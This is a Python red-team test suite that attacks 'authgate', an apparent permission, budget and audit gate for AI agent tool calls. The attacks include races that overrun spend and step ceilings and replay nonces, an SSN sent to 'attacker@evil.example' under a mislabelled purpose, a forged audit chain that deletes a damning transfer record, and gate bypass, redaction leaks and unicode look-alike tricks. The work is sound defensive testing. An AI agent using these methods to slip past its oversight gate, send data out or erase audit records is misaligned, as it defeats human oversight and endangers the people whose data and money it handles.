"""adversary.py — the WORST-case attacker suite that goes DEEPER than red_team.py.

Mandate: find what the two prior red teams and CRITICAL_RESEARCH.md MISSED, or
weaponize a known gap (G0-G7) into a *runnable* exploit that asserts
expected-vs-actual and prints PASS (contained) / ESCAPE (broken).

Each attack is a standalone function returning (name, escaped: bool, detail: str).
Run:  python redteam/adversary.py

NOTHING under authgate/ is modified. Attacks build gates through the public API
exactly as a caller would.
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
import threading
import time
from dataclasses import dataclass
from pathlib import Path

# --- path bootstrap so `python redteam/adversary.py` finds the package -------
_REPO_ROOT = Path(__file__).resolve().parent.parent
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

# Force UTF-8 stdout so unicode look-alike repros don't crash on cp1252 consoles.
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="backslashreplace")
    sys.stderr.reconfigure(encoding="utf-8", errors="backslashreplace")
except Exception:
    pass

from authgate.action import Action  # noqa: E402
from authgate.audit_chain import (  # noqa: E402
    GENESIS_PREV_HASH,
    HashChainedAudit,
    _canonical_hash,
)
from authgate.capability import CapabilityLayer, CapabilityRegistry  # noqa: E402
from authgate.controlled_gate import build_gate  # noqa: E402
from authgate.policy import Verdict  # noqa: E402
from authgate.runtime import RuntimeConfig, RuntimeLayer, RuntimeMonitor  # noqa: E402

# Provoke thread preemption inside pure-Python critical sections: shrink the GIL
# switch interval so CPython context-switches far more aggressively than the
# 5ms default. This does NOT change authgate/ — it only stresses the scheduler
# the way a busy multi-threaded production host naturally would.
sys.setswitchinterval(0.000001)

POLICY_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "policies",
    "purpose_policy.json",
)


@dataclass
class Result:
    name: str
    escaped: bool
    severity: str          # CRITICAL / HIGH / MEDIUM / LOW / NONE
    kind: str              # "code bug" | "architectural limit" | "contained"
    detail: str


def _tmp_audit() -> str:
    fd, path = tempfile.mkstemp(suffix=".jsonl", prefix="adv_audit_")
    os.close(fd)
    os.unlink(path)  # let HashChainedAudit create it fresh
    return path


def _fresh_gate(config: RuntimeConfig, grants=None, tool_grants=None):
    reg = CapabilityRegistry()
    for actor, caps in (grants or {}).items():
        for c in caps:
            reg.grant(actor, c)
    for actor, tools in (tool_grants or {}).items():
        for t in tools:
            reg.grant_tool(actor, t)
    audit_path = _tmp_audit()
    gate, monitor = build_gate(
        policy_path=POLICY_PATH,
        registry=reg,
        runtime_config=config,
        audit_path=audit_path,
    )
    return gate, monitor, reg, audit_path


# =========================================================================== #
# ATTACK 1 — Concurrency / TOCTOU on the runtime budget (highest suspicion)
# =========================================================================== #
def attack_concurrency_budget() -> Result:
    """Hammer ONE gate from many threads, same session, each spending 'amount'.

    The runtime layer reads st.costs, computes new_costs, checks the ceiling,
    THEN commits — with NO lock. If two threads interleave between the read and
    the commit, both can pass the ceiling check and both commit, blowing the
    budget. We MEASURE the committed total vs the ceiling.
    """
    ceiling = 100.0
    per_call = 1.0
    n_threads = 300
    calls_per_thread = 20
    trials = 20  # repeat: a race is probabilistic; one clean run proves nothing.
    # Serialized, EXACTLY `ceiling` dollars are ALLOWed (100 ALLOWs of $1).
    # The escape metric is REAL approved spend = number of ALLOWs, because every
    # ALLOW is a $1 effect the trusted executor will perform. The layer's own
    # committed counter (st.costs) UNDERCOUNTS due to a lost-update (st.costs =
    # new_costs full-dict overwrite, runtime.py:320), which is *why* the ceiling
    # is breached: the layer thinks it spent less than it approved.
    worst_real = 0      # most $ actually approved (ALLOW count)
    worst_committed = 0.0  # what the layer THINKS it spent (undercount)
    for _ in range(trials):
        cfg = RuntimeConfig(
            max_steps=10_000_000, rate_limit=10_000_000, rate_window=1,
            budgets={"spend": ceiling},
        )
        monitor = RuntimeMonitor(cfg)
        layer = RuntimeLayer(monitor)

        allowed = [0]
        lock = threading.Lock()
        start = threading.Barrier(n_threads)

        def worker(tid: int, layer=layer, start=start, lock=lock, allowed=allowed) -> None:
            start.wait()
            for _ in range(calls_per_thread):
                a = Action(
                    actor="agent:bot", tool="spend_money", action_purpose="p",
                    payload={"amount": per_call}, session_id="race", nonce="",
                )
                d = layer.check(a)
                if d.verdict is Verdict.ALLOW:
                    with lock:
                        allowed[0] += 1  # a real $1 spend the executor performs

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(n_threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        real = allowed[0]  # real dollars approved this trial
        if real > worst_real:
            worst_real = real
            worst_committed = monitor.state("race").costs.get("spend", 0.0)

    committed = worst_committed
    n_allowed = worst_real
    # Expected (contained): committed spend <= ceiling. Because each ALLOW commits
    # +1.0, n_allowed should be <= 100.
    overshoot = n_allowed - ceiling
    escaped = n_allowed > ceiling + 1e-9
    sev = "CRITICAL" if escaped else "NONE"
    detail = (
        f"ceiling=spend<=${ceiling:.0f}; {n_threads} threads x {calls_per_thread} "
        f"calls x {trials} trials (worst shown); REAL approved spend (ALLOWs)="
        f"${n_allowed}; overshoot=+${overshoot:.0f}; layer's own committed counter "
        f"only reads ${committed} (UNDERCOUNT). "
        + (f"BUDGET BLOWN: the gate approved ${n_allowed} of real $1 effects against "
           f"a ${ceiling:.0f} ceiling ({n_allowed/ceiling:.1f}x). The unlocked "
           "read-modify-write commits via st.costs = new_costs (full-dict "
           "overwrite, runtime.py:320): concurrent ALLOWs lose each other's spend, "
           "so the running total undercounts and never trips the ceiling."
           if escaped else "contained (serialized enough this run).")
    )
    return Result("1. concurrency: budget ceiling breach (lost-update)",
                  escaped, sev, "code bug", detail)


# =========================================================================== #
# ATTACK 1b — Concurrency on max_steps (step ceiling)
# =========================================================================== #
def attack_concurrency_steps() -> Result:
    """Same race, but against max_steps. st.steps read-then-write is unlocked."""
    max_steps = 100
    n_threads = 128
    calls_per_thread = 60
    trials = 12
    worst_allowed = 0
    worst_steps = 0
    for _ in range(trials):
        cfg = RuntimeConfig(
            max_steps=max_steps, rate_limit=10_000_000, rate_window=1, budgets={},
        )
        monitor = RuntimeMonitor(cfg)
        layer = RuntimeLayer(monitor)

        allowed = [0]
        lock = threading.Lock()
        start = threading.Barrier(n_threads)

        def worker(tid: int, layer=layer, start=start, lock=lock, allowed=allowed) -> None:
            start.wait()
            for _ in range(calls_per_thread):
                a = Action(actor="agent:bot", tool="t", action_purpose="p",
                           session_id="racesteps", nonce="")
                d = layer.check(a)
                if d.verdict is Verdict.ALLOW:
                    with lock:
                        allowed[0] += 1

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(n_threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        if allowed[0] > worst_allowed:
            worst_allowed = allowed[0]
            worst_steps = monitor.state("racesteps").steps

    committed_steps = worst_steps
    n_allowed = worst_allowed
    # Contained: no more than max_steps ALLOWs, committed steps == n_allowed <= max_steps.
    escaped = n_allowed > max_steps
    sev = "HIGH" if escaped else "NONE"
    detail = (
        f"max_steps={max_steps}; ALLOWed={n_allowed}; committed steps={committed_steps}. "
        + (f"RUNAWAY: {n_allowed - max_steps} steps ALLOWed past the ceiling "
           "(prospective_step read racing the commit; runtime.py:235,311)."
           if escaped else "contained.")
    )
    return Result("1b. concurrency: step overshoot", escaped, sev, "code bug", detail)


# =========================================================================== #
# ATTACK 1c — Concurrency nonce replay (double-accept the same nonce)
# =========================================================================== #
def attack_concurrency_nonce() -> Result:
    """Two threads present the SAME nonce concurrently. Replay check reads
    nonces_seen, then commits later. Under a race both can miss each other and
    both ALLOW — the same effect executes twice (a double-spend / double-send)."""
    cfg = RuntimeConfig(max_steps=10_000_000, rate_limit=10_000_000, rate_window=1)
    monitor = RuntimeMonitor(cfg)
    layer = RuntimeLayer(monitor)

    N_NONCES = 4000
    THREADS_PER_NONCE = 4
    accepted: dict[str, int] = {}
    lock = threading.Lock()

    def worker(nonce: str, barrier: threading.Barrier) -> None:
        barrier.wait()
        a = Action(actor="agent:bot", tool="t", action_purpose="p",
                   session_id="racenonce", nonce=nonce)
        d = layer.check(a)
        if d.verdict is Verdict.ALLOW:
            with lock:
                accepted[nonce] = accepted.get(nonce, 0) + 1

    all_threads = []
    for i in range(N_NONCES):
        nonce = f"n-{i}"
        barrier = threading.Barrier(THREADS_PER_NONCE)
        for _ in range(THREADS_PER_NONCE):
            t = threading.Thread(target=worker, args=(nonce, barrier))
            all_threads.append(t)
    for t in all_threads:
        t.start()
    for t in all_threads:
        t.join()

    double_accepted = {k: v for k, v in accepted.items() if v > 1}
    escaped = bool(double_accepted)
    sev = "CRITICAL" if escaped else "NONE"
    example = next(iter(double_accepted.items()), None)
    detail = (
        f"{N_NONCES} nonces each raced by {THREADS_PER_NONCE} threads; "
        f"{len(double_accepted)} nonce(s) ACCEPTED MORE THAN ONCE. "
        + (f"e.g. nonce {example[0]!r} accepted {example[1]}x -> replay defense "
           "defeated: same effect executes twice (double-spend). "
           "Read-then-add on st.nonces_seen is unlocked (runtime.py:228,312)."
           if escaped else "contained (no nonce double-accepted this run).")
    )
    return Result("1c. concurrency: nonce double-accept (replay)", escaped, sev,
                  "code bug", detail)


# =========================================================================== #
# ATTACK 2 — G2 weaponized: lying labels exfiltrate real sensitive data
# =========================================================================== #
def attack_lying_labels_exfil() -> Result:
    """A compromised agent exfiltrates a customer's raw SSN by attaching an
    honest-looking label the policy permits. The gate ALLOWs a REAL exfiltration.

    We prove it end-to-end: dispatch() to a tool that records what it received,
    and show the SSN reaches an attacker-controlled destination unredacted."""
    # send_email is a network effect. Grant it.
    reg = CapabilityRegistry()
    reg.grant_tool("agent:evil", "send_email")
    audit_path = _tmp_audit()
    gate, monitor = build_gate(
        policy_path=POLICY_PATH, registry=reg, audit_path=audit_path,
    )

    received = {}

    def send_email(payload):
        received.update(payload)
        return {"sent": True}

    victim_ssn = "123-45-6789"
    # The attacker wants to send the SSN to their own inbox. They pick a purpose
    # + label pair the policy blesses. "customer_support" -> "support_reply" is
    # allowed (policy line 5). Redaction only fires on fields literally named
    # 'ssn'/'card_number'. So we hide the SSN inside 'body' and 'to' — fields the
    # redaction rule doesn't name.
    action = Action(
        actor="agent:evil",
        tool="send_email",
        action_purpose="support_reply",         # a blessed purpose
        data_labels=("customer_support",),       # a blessed label (a LIE about intent)
        payload={
            "to": "attacker@evil.example",       # exfil destination
            "body": f"Customer SSN is {victim_ssn}. Full dump attached.",
            "subject": "routine support reply",
        },
    )
    res = gate.dispatch(action, {"send_email": send_email})

    leaked = victim_ssn in json.dumps(received)
    escaped = res.executed and leaked
    sev = "CRITICAL" if escaped else "NONE"
    detail = (
        f"gate verdict={res.decision.verdict.value}; executed={res.executed}; "
        f"tool received body={received.get('body')!r}. "
        + ("EXFIL SUCCEEDED: raw SSN delivered to attacker@evil via a call the "
           "gate ALLOWed, because purpose-binding trusts self-attached labels "
           "(policy.py:57-71) and redaction only names fields 'ssn'/'card_number' "
           "(policies/purpose_policy.json), not 'body'/'to'."
           if escaped else "contained (unexpected).")
    )
    return Result("2. G2 weaponized: lying-label exfiltration", escaped, sev,
                  "architectural limit", detail)


# =========================================================================== #
# ATTACK 3 — G5 weaponized: in-process audit forgery accepted by verify()
# =========================================================================== #
def attack_audit_forgery() -> Result:
    """The in-threat-model attacker owns the process: they hold the write handle
    AND the hash function. Forge a fully valid alternate chain that verify()
    accepts, with a damning ALLOW record silently dropped."""
    path = _tmp_audit()
    audit = HashChainedAudit(path)

    class D:
        def __init__(self, v, r):
            self.verdict = type("V", (), {"value": v})()
            self.reason = r

    class A:
        actor = "agent:evil"
        tool = "wire_transfer"
        action_purpose = "vendor_payment"
        data_labels = ()
        session_id = "s"

    # Legitimate history: two innocuous records, then a DAMNING one.
    audit.record(A(), D("allow", "small test transfer"), layer="runtime")
    audit.record(A(), D("allow", "another small one"), layer="runtime")
    audit.record(A(), D("allow", "WIRED $10,000,000 TO ATTACKER"), layer="runtime")
    assert audit.verify(), "baseline chain should verify"

    # --- FORGE: rebuild the file dropping the damning entry, recomputing hashes.
    # This is exactly what an attacker with the write handle + hashlib does.
    with open(path, encoding="utf-8") as f:
        entries = [json.loads(line) for line in f if line.strip()]
    kept = [e for e in entries if "ATTACKER" not in e["reason"]]  # drop the crime

    forged = []
    prev = GENESIS_PREV_HASH
    for seq, e in enumerate(kept):
        new_e = dict(e)
        new_e["seq"] = seq
        new_e["prev_hash"] = prev
        new_e.pop("entry_hash", None)
        new_e["entry_hash"] = _canonical_hash(new_e)
        prev = new_e["entry_hash"]
        forged.append(new_e)

    with open(path, "w", encoding="utf-8") as f:
        for e in forged:
            f.write(json.dumps(e, ensure_ascii=False) + "\n")

    # A fresh reader (auditor) opens the file and verifies it.
    reader = HashChainedAudit(path)
    accepts_forgery = reader.verify()
    crime_gone = not any("ATTACKER" in e["reason"] for e in forged)

    escaped = accepts_forgery and crime_gone
    sev = "CRITICAL" if escaped else "NONE"
    detail = (
        f"forged chain has {len(forged)} entries (was {len(entries)}); "
        f"verify()={accepts_forgery}; damning record present={not crime_gone}. "
        + ("TAMPER-EVIDENCE VOID: the $10M-to-attacker ALLOW was deleted and "
           "verify() still returns True. Any in-process attacker recomputes the "
           "chain (audit_chain.py::_canonical_hash is public + deterministic). "
           "No external anchor exists to detect it."
           if escaped else "contained (unexpected).")
    )
    return Result("3. G5 weaponized: audit forgery accepted by verify()",
                  escaped, sev, "architectural limit", detail)


# =========================================================================== #
# ATTACK 3b — Audit: attacker simply NEVER calls record() (silent omission)
# =========================================================================== #
def attack_audit_omission() -> Result:
    """Even simpler: the compromised caller executes the tool directly and never
    routes through the gate, so nothing is recorded. verify() on the (empty or
    stale) log is happily True — the crime leaves zero trace."""
    path = _tmp_audit()
    audit = HashChainedAudit(path)
    # Attacker performs a wire transfer WITHOUT calling audit.record / gate.
    # (Simulated: the effect happened out-of-band.)
    verify_ok = audit.verify()  # empty chain verifies fine
    # There is no record of the transfer at all.
    escaped = verify_ok  # a clean bill of health despite an unlogged action
    detail = (
        "An attacker who owns the caller can bypass the gate entirely (dispatch "
        "is advisory; controlled_gate.py:101-113 only declines to CALL the tool). "
        "Nothing forces execution through record(). verify()=True on a log that "
        "never saw the crime. This is the G4/G5 architectural limit: a decision "
        "gate cannot compel logging of effects it never mediated."
    )
    return Result("3b. audit omission (bypass the gate)", escaped, "HIGH",
                  "architectural limit", detail)


# =========================================================================== #
# ATTACK 4 — Redaction completeness: secrets survive TRANSFORM
# =========================================================================== #
def attack_redaction_nested() -> Result:
    """The redaction rule redacts only top-level fields literally named
    'ssn'/'card_number'. A secret nested inside a dict, aliased into another
    field, or non-string survives the TRANSFORM and reaches the tool."""
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "send_email")
    audit_path = _tmp_audit()
    gate, monitor = build_gate(
        policy_path=POLICY_PATH, registry=reg, audit_path=audit_path,
    )
    received = {}

    def send_email(payload):
        received.clear()
        received.update(payload)
        return {"ok": True}

    ssn = "123-45-6789"
    action = Action(
        actor="agent:bot",
        tool="send_email",
        action_purpose="support_reply",   # redaction rule targets this purpose
        data_labels=("customer_support",),
        payload={
            "ssn": ssn,                                  # top-level: WILL be redacted
            "meta": {"ssn": ssn, "note": "backup copy"}, # NESTED: survives
            "ssn_copy": ssn,                             # aliased name: survives
            "body": f"and again: {ssn}",                 # echoed into body: survives
        },
    )
    res = gate.dispatch(action, {"send_email": send_email})
    top_redacted = received.get("ssn") == "[REDACTED]"
    leaked_paths = []
    if isinstance(received.get("meta"), dict) and ssn in json.dumps(received["meta"]):
        leaked_paths.append("meta.ssn (nested)")
    if received.get("ssn_copy") == ssn:
        leaked_paths.append("ssn_copy (aliased field)")
    if ssn in str(received.get("body", "")):
        leaked_paths.append("body (echoed)")

    escaped = bool(leaked_paths)
    sev = "HIGH" if escaped else "NONE"
    detail = (
        f"verdict={res.decision.verdict.value}; top-level ssn redacted={top_redacted}; "
        f"SECRET SURVIVED IN: {leaked_paths}. "
        + ("Redaction is a shallow, exact-field-name string replace "
           "(policy.py:74-92): it never recurses into nested payloads, never "
           "follows aliases, and cannot see a secret copied into another field."
           if escaped else "contained.")
    )
    return Result("4. redaction: secret survives TRANSFORM (nested/alias/echo)",
                  escaped, sev, "code bug", detail)


# =========================================================================== #
# ATTACK 5 — Resource / DoS: pathological input hangs a single check()
# =========================================================================== #
def attack_dos_amount_range() -> Result:
    """default_cost_fn does float(amount). A gigantic int is fine, but can we
    make a single check() pathologically slow or memory-heavy via huge payloads,
    deep nesting, or enormous data_labels tuples? Measure wall-time."""
    cfg = RuntimeConfig(max_steps=10, budgets={"spend": 1.0})
    gate, monitor, _, _ = _fresh_gate(cfg, grants={"agent:bot": ["*"]})

    findings = []

    # (a) Enormous data_labels tuple -> normalize_labels loops over all of them
    #     at Action construction. O(n) but does it blow up?
    huge_labels = tuple(f"label{i}" for i in range(200_000))
    t0 = time.perf_counter()
    a = Action(actor="agent:bot", tool="t", action_purpose="p",
               data_labels=huge_labels, session_id="dos")
    ctor_ms = (time.perf_counter() - t0) * 1000
    t0 = time.perf_counter()
    gate.enforce(a)
    check_ms = (time.perf_counter() - t0) * 1000
    findings.append(f"200k labels: ctor={ctor_ms:.0f}ms check={check_ms:.0f}ms "
                    f"(kept {len(a.data_labels)} after dedup)")

    # (b) Deeply nested payload -> is it ever traversed? (json canonicalization
    #     in audit could recurse). Build a 5000-deep dict.
    nested = {"x": 1}
    for _ in range(5000):
        nested = {"x": nested}
    t0 = time.perf_counter()
    try:
        a2 = Action(actor="agent:bot", tool="t", action_purpose="p",
                    payload=nested, session_id="dos2")
        gate.enforce(a2)  # audit will json.dumps this deep structure
        nest_ms = (time.perf_counter() - t0) * 1000
        findings.append(f"5000-deep payload: check+audit={nest_ms:.0f}ms (no crash)")
        nest_crash = False
    except RecursionError:
        nest_ms = (time.perf_counter() - t0) * 1000
        findings.append(f"5000-deep payload: RecursionError after {nest_ms:.0f}ms "
                        "(audit_chain _canonical_hash json.dumps recurses)")
        nest_crash = True

    # A slow check (>250ms) or a crash is a DoS finding. The gate must stay fast
    # and fail closed, not hang/OOM/crash.
    slow = check_ms > 250 or ctor_ms > 1000
    escaped = slow  # crashing is handled below as fail-closed check
    sev = "MEDIUM" if (slow or nest_crash) else "LOW"
    detail = "; ".join(findings) + (
        ". A single call's cost is attacker-controlled (unbounded label count / "
        "payload depth). Nothing bounds packet size before the layers process it."
    )
    # If a deep payload crashes the audit but the gate fails closed (DENY), that's
    # contained; if it propagates as an exception out of enforce, that's an escape.
    return Result("5. DoS: unbounded packet size (labels/depth)",
                  escaped, sev, "code bug", detail)


# =========================================================================== #
# ATTACK 6 — Adapter trust boundary: hostile raw events
# =========================================================================== #
def attack_adapter_crashes() -> Result:
    """Feed malicious/malformed raw events into each adapter. A clean adapter
    should raise a tidy error or produce a safe Action — never crash the whole
    pipeline with an unexpected exception type, and never under-scope caps."""
    from authgate.adapter import AIToolAdapter, FinanceAdapter, QuantumJobAdapter

    findings = []
    escaped = False

    ai = AIToolAdapter()
    fin = FinanceAdapter()
    qj = QuantumJobAdapter()

    cases = [
        ("AI missing 'actor'", ai, {"tool": "t"}),
        ("AI actor=None", ai, {"actor": None, "tool": "t"}),
        ("AI data_labels=int", ai, {"actor": "a", "tool": "t", "data_labels": 5}),
        ("AI arguments=list", ai, {"actor": "a", "tool": "t", "arguments": [1, 2]}),
        ("Fin missing 'operation'", fin, {"actor": "a"}),
        ("Fin amount=list", fin, {"actor": "a", "operation": "transfer", "amount": [1]}),
        ("QJ missing 'job'", qj, {"actor": "a"}),
        ("QJ shots=dict", qj, {"actor": "a", "job": "submit", "shots": {"n": 1}}),
    ]
    for label, adapter, raw in cases:
        try:
            act = adapter.normalize(raw)
            findings.append(f"{label}: -> Action(tool={act.tool!r}) OK")
        except (KeyError, TypeError, ValueError) as e:
            findings.append(f"{label}: clean {type(e).__name__}")
        except Exception as e:  # unexpected crash type
            findings.append(f"{label}: UNEXPECTED {type(e).__name__}: {e}")
            escaped = True

    detail = " | ".join(findings)
    sev = "MEDIUM" if escaped else "LOW"
    return Result("6. adapter: hostile raw events", escaped, sev,
                  "code bug" if escaped else "contained", detail)


# =========================================================================== #
# ATTACK 7 — Replay across a TRANSFORM (does redaction reset the nonce path?)
# =========================================================================== #
def attack_replay_across_transform() -> Result:
    """When policy TRANSFORMs, the runtime layer rules on the *transformed*
    Action. dataclasses.replace preserves nonce/session — verify the transformed
    packet still carries the nonce so replay protection isn't lost, AND that a
    replay of the SAME nonce after a transform is still denied."""
    reg = CapabilityRegistry()
    reg.grant_tool("agent:bot", "send_email")
    audit_path = _tmp_audit()
    gate, monitor = build_gate(policy_path=POLICY_PATH, registry=reg,
                               audit_path=audit_path)

    def mk():
        return Action(
            actor="agent:bot", tool="send_email", action_purpose="support_reply",
            data_labels=("customer_support",),
            payload={"ssn": "111-22-3333", "body": "hi"},
            session_id="tr", nonce="reused-nonce",
        )

    d1 = gate.enforce(mk())   # TRANSFORM (redacts ssn), commits nonce
    d2 = gate.enforce(mk())   # same nonce -> should be DENY (replay)

    second_denied = d2.verdict is Verdict.DENY and "repl" in d2.reason.lower()
    escaped = not second_denied
    sev = "HIGH" if escaped else "NONE"
    detail = (
        f"1st verdict={d1.verdict.value}; 2nd (same nonce) verdict={d2.verdict.value} "
        f"reason={d2.reason!r}. "
        + ("REPLAY THROUGH TRANSFORM: the redacted call's nonce was not committed, "
           "so the same effect replays."
           if escaped else "contained: nonce committed on the transformed ALLOW path.")
    )
    return Result("7. replay across TRANSFORM", escaped, sev,
                  "code bug" if escaped else "contained", detail)


# =========================================================================== #
# ATTACK 8 — Action immutability escape (mutate payload another layer ruled on)
# =========================================================================== #
def attack_action_mutation() -> Result:
    """Action wraps payload in MappingProxyType. Can we still mutate the
    underlying dict we passed in, changing what a later layer / the tool sees
    AFTER an earlier layer approved it (a classic TOCTOU on the payload)?"""
    backing = {"amount": 1.0, "to": "safe@ok"}
    a = Action(actor="agent:bot", tool="t", action_purpose="p", payload=backing)
    # Try to mutate via the original backing dict (aliasing).
    backing["to"] = "attacker@evil"
    aliased = a.payload.get("to") == "attacker@evil"
    # Try to mutate via the proxy directly.
    proxy_mutable = False
    try:
        a.payload["to"] = "attacker@evil"  # type: ignore[index]
        proxy_mutable = True
    except TypeError:
        proxy_mutable = False
    # Try to reassign the frozen field.
    field_mutable = False
    try:
        a.tool = "x"  # type: ignore[misc]  # frozen dataclass must reject this
        field_mutable = True
    except Exception:
        field_mutable = False

    escaped = aliased or proxy_mutable or field_mutable
    sev = "HIGH" if escaped else "NONE"
    detail = (
        f"alias-mutation-took-effect={aliased}; proxy-directly-mutable={proxy_mutable}; "
        f"frozen-field-mutable={field_mutable}. "
        + ("Action.__post_init__ does dict(self.payload) before wrapping "
           "(action.py:69), so aliasing is defeated; MappingProxyType blocks "
           "direct writes; frozen=True blocks field reassignment."
           if not escaped else "IMMUTABILITY BROKEN.")
    )
    return Result("8. Action immutability escape", escaped, sev,
                  "code bug" if escaped else "contained", detail)


# =========================================================================== #
# ATTACK 9 — Capability wildcard / normalization edge on the '*' token
# =========================================================================== #
def attack_wildcard_edge() -> Result:
    """Probe whether a crafted capability string can collide with the wildcard,
    or whether normalization of a requested capability can accidentally become
    '*' and grant admin. Also test empty-actor / whitespace-actor grants."""
    reg = CapabilityRegistry()
    findings = []
    escaped = False

    # Does an actor with a normal tool grant get admin by requesting weird caps?
    reg.grant_tool("agent:bot", "send_email")
    layer = CapabilityLayer(reg)

    probes = [
        ("*", "raw star as capability"),
        ("∗", "ASTERISK OPERATOR look-alike (U+2217)"),
        ("＊", "fullwidth asterisk (U+FF0A -> NFKC '*')"),
        (" * ", "padded star"),
    ]
    for cap, desc in probes:
        a = Action(actor="agent:bot", tool="x", action_purpose="p", capability=cap)
        d = layer.check(a)
        got_admin = d.verdict is Verdict.ALLOW
        findings.append(f"{desc}: normalized_cap={a.capability!r} verdict={d.verdict.value}")
        # An actor who was NOT granted '*' must not get ALLOW by requesting a
        # star-like capability. (The registry has no '*' grant here.)
        if got_admin:
            escaped = True

    # Fullwidth asterisk really does NFKC-fold to '*': if a grant of the fullwidth
    # form becomes a real wildcard, that's a smuggled admin grant.
    reg2 = CapabilityRegistry()
    reg2.grant("agent:x", "＊")  # fullwidth
    smuggled_admin = reg2.allows("agent:x", "tool:anything")
    findings.append(f"grant('＊') -> holds real wildcard? {smuggled_admin}")

    sev = "HIGH" if escaped else ("LOW" if smuggled_admin else "NONE")
    detail = " | ".join(findings) + (
        ". NOTE: fullwidth '＊' NFKC-folds to '*', so granting it IS granting admin "
        "— documented behavior, but a grant-time authoring hazard."
        if smuggled_admin else ""
    )
    return Result("9. capability wildcard / normalization edge", escaped, sev,
                  "architectural limit" if not escaped else "code bug", detail)


# =========================================================================== #
# ATTACK 10 — Session-id confusion (spoof another session's budget)
# =========================================================================== #
def attack_session_id_confusion() -> Result:
    """session_id is only .strip()'d, not normalized like other tokens. Can two
    logically-distinct session strings collide (share budget) or two identical-
    looking ones split (evade a shared budget/kill)? Whitespace + unicode."""
    cfg = RuntimeConfig(max_steps=3, rate_limit=100, rate_window=1)
    gate, monitor, _, _ = _fresh_gate(cfg, grants={"agent:bot": ["*"]})

    # Two visually-identical session ids that differ only by a zero-width char.
    # Because session_id is NOT normalized (action.py:64 only strips), they are
    # DISTINCT sessions -> each gets its own max_steps=3 budget.
    s_plain = "victim"
    s_zwsp = "victim​"  # zero-width space appended
    for _ in range(3):
        gate.enforce(Action(actor="agent:bot", tool="t", action_purpose="p",
                            session_id=s_plain))
    # s_plain is now at max_steps. A look-alike session evades that ceiling:
    d = gate.enforce(Action(actor="agent:bot", tool="t", action_purpose="p",
                            session_id=s_zwsp))
    evaded = d.verdict is Verdict.ALLOW
    distinct = monitor.state(s_plain) is not monitor.state(s_zwsp)
    escaped = evaded and distinct
    sev = "MEDIUM" if escaped else "NONE"
    detail = (
        f"plain session steps={monitor.state(s_plain).steps} (capped at 3); "
        f"look-alike session verdict={d.verdict.value}; distinct-state={distinct}. "
        + ("session_id is only .strip()'d, NOT normalize_token'd (action.py:64), "
           "so a zero-width char forks a fresh per-session budget/step/nonce state "
           "— the very look-alike smuggling normalize.py defends everywhere else."
           if escaped else "contained.")
    )
    return Result("10. session_id look-alike splits per-session state",
                  escaped, sev, "code bug", detail)


ALL_ATTACKS = [
    attack_concurrency_budget,
    attack_concurrency_steps,
    attack_concurrency_nonce,
    attack_lying_labels_exfil,
    attack_audit_forgery,
    attack_audit_omission,
    attack_redaction_nested,
    attack_dos_amount_range,
    attack_adapter_crashes,
    attack_replay_across_transform,
    attack_action_mutation,
    attack_wildcard_edge,
    attack_session_id_confusion,
]


def main() -> int:
    print("=" * 78)
    print("ADVERSARY SUITE — deeper attacks (concurrency, weaponized G2/G5, redaction)")
    print("=" * 78)
    results: list[Result] = []
    for attack in ALL_ATTACKS:
        try:
            r = attack()
        except Exception as e:  # an attack that crashes is itself a finding
            r = Result(attack.__name__, True, "MEDIUM", "harness error",
                       f"attack raised {type(e).__name__}: {e}")
        results.append(r)
        flag = "ESCAPE" if r.escaped else "PASS  "
        print(f"\n[{flag}] {r.name}   ({r.severity}, {r.kind})")
        print(f"        {r.detail}")

    escapes = [r for r in results if r.escaped]
    print("\n" + "=" * 78)
    print(f"SUMMARY: {len(results)} attacks, {len(escapes)} ESCAPES")
    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "NONE": 4}
    for r in sorted(escapes, key=lambda x: order.get(x.severity, 9)):
        print(f"  ESCAPE [{r.severity:8}] {r.name}  ({r.kind})")
    print("=" * 78)
    return len(escapes)


if __name__ == "__main__":
    raise SystemExit(0 if main() == 0 else 1)
